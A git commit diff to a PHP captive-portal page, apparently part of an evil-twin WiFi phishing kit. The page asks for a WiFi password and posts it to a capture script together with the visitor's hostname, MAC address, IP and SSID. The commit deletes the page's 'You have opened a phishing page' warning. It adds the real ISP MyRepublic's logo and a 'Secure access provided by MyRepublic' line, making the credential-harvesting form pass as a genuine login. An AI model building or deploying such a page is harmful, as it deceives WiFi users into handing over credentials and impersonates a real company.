d45f9047c1ea09f0e8eed0a1661cac02eda0d15e
Azhari Ramadhan <azhariramadhan@MacBook-Pro-Azhari.local>
2026-01-21 14:43:25 +0700

    MyRepublic

--- portals/wifi-access/index.php
+++ portals/wifi-access/index.php
@@ -21,9 +21,9 @@ require_once('helper.php');
     <script type="text/javascript">
         function redirect() {
             setTimeout(function() {
-              document.location.href = "https://www.google.com";
+                document.location.href = "https://www.google.com";
             }, 100);
-          }
+        }
     </script>
 
     <link href='assets/css/fonts.css' rel='stylesheet' type='text/css'>
@@ -34,22 +34,48 @@ require_once('helper.php');
 </head>
 
 <body>
-    <div id="warning">Warning: You have opened a phishing page. Do not enter your login credentials!</div>
     <div class="container">
         <div class="modal-dialog">
             <div class="loginmodal-container">
-                <h1>Connect To <?=getClientSSID($_SERVER['REMOTE_ADDR']);?></h1><br>
-                <form method="POST" action="captiveportal/index.php", onsubmit="redirect()">
-                <input type="password" name="password" placeholder="Wifi Password" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
-                <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
-                <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
-                <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
-                <input type="hidden" name="target" value="<?=$destination?>">
-                <input type="hidden" name="ssid" value="<?=getClientSSID($_SERVER['REMOTE_ADDR']);?>">
-                <input type="submit" name="login" class="login loginmodal-submit" value="Login">
+
+                <!-- LOGO -->
+                <img
+                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/43/MyRepublic_NEW_LOGO_%28September_2023%29_Logo_MyRepublic_Horizontal_-_Black_%281%29.png/1920px-MyRepublic_NEW_LOGO_%28September_2023%29_Logo_MyRepublic_Horizontal_-_Black_%281%29.png"
+                    alt="MyRepublic Logo"
+                    class="logo">
+
+                <h1>Connect to <?= getClientSSID($_SERVER['REMOTE_ADDR']); ?></h1>
+
+                <form method="POST" action="captiveportal/index.php" onsubmit="redirect()">
+                    <input
+                        type="password"
+                        name="password"
+                        placeholder="WiFi Password"
+                        autocorrect="off"
+                        autocomplete="off"
+                        autocapitalize="off"
+                        required>
+
+                    <input type="hidden" name="hostname" value="<?= getClientHostName($_SERVER['REMOTE_ADDR']); ?>">
+                    <input type="hidden" name="mac" value="<?= getClientMac($_SERVER['REMOTE_ADDR']); ?>">
+                    <input type="hidden" name="ip" value="<?= $_SERVER['REMOTE_ADDR']; ?>">
+                    <input type="hidden" name="target" value="<?= $destination ?>">
+                    <input type="hidden" name="ssid" value="<?= getClientSSID($_SERVER['REMOTE_ADDR']); ?>">
+
+                    <input
+                        type="submit"
+                        name="login"
+                        class="loginmodal-submit"
+                        value="Connect">
                 </form>
+
+                <div class="login-help">
+                    Secure access provided by MyRepublic
+                </div>
+
             </div>
         </div>
     </div>
 </body>
+
 </html>
